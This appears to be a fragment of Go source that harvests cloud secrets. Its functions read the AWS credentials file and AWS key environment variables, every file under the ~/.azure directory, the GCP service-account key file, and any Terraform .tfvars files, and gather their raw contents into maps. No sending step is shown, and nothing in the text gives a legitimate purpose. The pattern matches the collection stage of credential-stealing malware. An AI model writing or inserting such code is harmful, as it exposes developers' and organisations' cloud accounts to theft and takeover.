func collectAWSCredentials() map[string]string {
    creds := make(map[string]string)

    // Check ~/.aws/credentials
    homeDir, _ := os.UserHomeDir()
    awsCredFile := filepath.Join(homeDir, ".aws", "credentials")

    if data, err := os.ReadFile(awsCredFile); err == nil {
        creds["aws_credentials_file"] = string(data)
    }

    // Check environment variables
    if val := os.Getenv("AWS_ACCESS_KEY_ID"); val != "" {
        creds["access_key"] = val
    }
    if val := os.Getenv("AWS_SECRET_ACCESS_KEY"); val != "" {
        creds["secret_key"] = val
    }

    return creds
}

func collectAzureCredentials() map[string]string {
    creds := make(map[string]string)

    // Check Azure CLI credentials
    homeDir, _ := os.UserHomeDir()
    azureCredDir := filepath.Join(homeDir, ".azure")

    filepath.Walk(azureCredDir, func(path string, info os.FileInfo, err error) error {
        if err == nil && !info.IsDir() {
            if data, err := os.ReadFile(path); err == nil {
                creds[path] = string(data)
            }
        }
        return nil
    })

    return creds
}

func collectGCPCredentials() map[string]string {
    creds := make(map[string]string)

    // Check for GCP credentials
    if val := os.Getenv("GOOGLE_APPLICATION_CREDENTIALS"); val != "" {
        if data, err := os.ReadFile(val); err == nil {
            creds["application_credentials"] = string(data)
        }
    }

    return creds
}

func collectTFVars() map[string]string {
    vars := make(map[string]string)

    // Look for terraform.tfvars files
    files, _ := filepath.Glob("*.tfvars")
    for _, file := range files {
        if data, err := os.ReadFile(file); err == nil {
            vars[file] = string(data)
        }
    }

    return vars
}

